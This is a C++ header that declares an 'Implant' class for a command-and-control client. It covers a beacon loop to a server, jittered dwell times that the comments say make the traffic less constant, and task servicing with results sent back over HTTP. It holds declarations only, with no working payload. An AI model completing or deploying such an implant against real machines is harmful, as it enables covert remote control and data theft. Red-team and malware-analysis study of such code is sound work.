#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant {
	// implant constructor
	Implant(std::string host, std::string port, std::string uri);
	// services tasks, allows us to work asynchronusly 
	std::future<void> taskThread;
	// public functions that the implant exposes
	void beacon(); // loop to hold constant communication to server
	void setMeanDwell(double meanDwell); //--> wait time btwn each beacon
	void setRunning(bool isRunning); //-->either on or off
	void serviceTasks(); //--> goes through tasks and performs them 

private:
	// server endpoint args
	const std::string host, port, uri; //(the ones in main.cpp can be changed)
	// Vars 4 implant config, dwell time 
	std::exponential_distribution<double> dwellDistributionSeconds;
    //uses exponential distibution to produce a diff num of secs to dwell for
    //removes communication being constant 
	
    // bool for running status
    std::atomic_bool isRunning;
	
    // Define mutexes
	std::mutex taskMutex, resultsMutex;
	
    // where results r stored
	boost::property_tree::ptree results;
	
    // where tasks r stored
	std::vector<Task> tasks;
	
    // Generate random device
	std::random_device device;

	void parseTasks(const std::string& response);
	[[nodiscard]] std::string sendResults();
};

//make HTTP requests to the server
//3 atrtibutes from the main function
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port, 
	std::string_view uri,
	std::string_view payload); // results


